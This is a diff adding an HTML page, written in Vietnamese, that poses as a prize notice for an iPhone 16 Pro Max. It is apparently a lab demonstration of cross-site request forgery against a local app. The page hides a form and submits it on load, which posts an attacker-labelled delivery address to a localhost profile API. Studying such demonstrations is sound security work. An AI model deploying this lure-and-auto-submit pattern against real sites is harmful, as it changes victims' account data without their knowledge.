@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>🎁 Chúc mừng! Bạn đã trúng thưởng!</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f0f0; }
+        h1 { color: #e74c3c; }
+        .prize { font-size: 48px; margin: 20px; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <h1>🎉 Chúc mừng! Bạn đã trúng iPhone 16 Pro Max! 🎉</h1>
+    <div class="prize">📱</div>
+    <p>Vui lòng đợi trong khi chúng tôi xác nhận giải thưởng...</p>
+
+    <!-- CSRF: Form ẩn tự động submit khi nạn nhân mở trang -->
+    <form id="csrf-form" class="hidden" action="http://localhost:8081/api/profile/addresses" method="POST">
+        <input type="hidden" name="recipientName" value="ATTACKER - CSRF ATTACK">
+        <input type="hidden" name="phone" value="0666666666">
+        <input type="hidden" name="line1" value="Dia chi bi hack qua CSRF">
+        <input type="hidden" name="district" value="Quan Hacker">
+        <input type="hidden" name="city" value="TP Hack City">
+        <input type="hidden" name="note" value="Address injected via CSRF attack">
+    </form>
+
+    <script>
+        // Tự động submit form khi trang load
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
